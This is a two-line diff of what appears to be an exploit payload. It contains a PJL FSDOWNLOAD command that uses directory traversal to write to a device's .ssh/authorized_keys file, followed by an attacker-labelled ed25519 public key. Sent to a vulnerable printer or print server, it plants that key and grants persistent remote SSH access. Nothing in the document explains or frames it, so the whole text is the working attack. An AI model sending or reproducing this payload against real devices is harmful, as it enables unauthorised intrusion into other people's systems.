@@ -1,1 +1,2 @@
-@PJL FSDOWNLOAD NAME="0:\..\.ssh\authorized_keys" SIZE=99
+> @PJL FSDOWNLOAD NAME="0:\..\.ssh\authorized_keys" SIZE=99
+> ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlPpE7HfnsYTu2o7zu1bKMqwbOYHmUg6GlHxvDqbjdw wiseman@0xwis3m4n
